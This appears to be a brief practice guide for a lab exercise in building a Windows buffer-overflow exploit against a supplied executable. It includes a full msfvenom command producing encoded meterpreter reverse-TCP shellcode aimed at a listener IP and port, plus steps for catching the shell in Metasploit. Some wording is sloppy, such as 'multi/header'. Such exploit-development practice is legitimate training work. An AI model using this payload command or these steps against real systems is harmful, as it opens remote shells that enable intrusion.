You can practice creating an basic exploit for provided exe.

First you should identify the specific point that buffer overs flow. 
Then find the addresses that you can reach which implies eip in the script.
For a clear vision you can use \xCC for interruption.
Use command below for buf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.75.133 LPORT=400 -e x86/shikata_ga_nai -b '\x00' -i 3 -f python > result.txt 

Add the information in result.txt to the script.

I use immunity debugger and mona together

1. Run and observe the exe
2. Use metasploit -- multi/header
3. Specify the payload, ip and port
4. Run the exploit
5. Run the script
6. For passing interruptions use play button
7. At the end of the interruption, you should see shell in metasploit
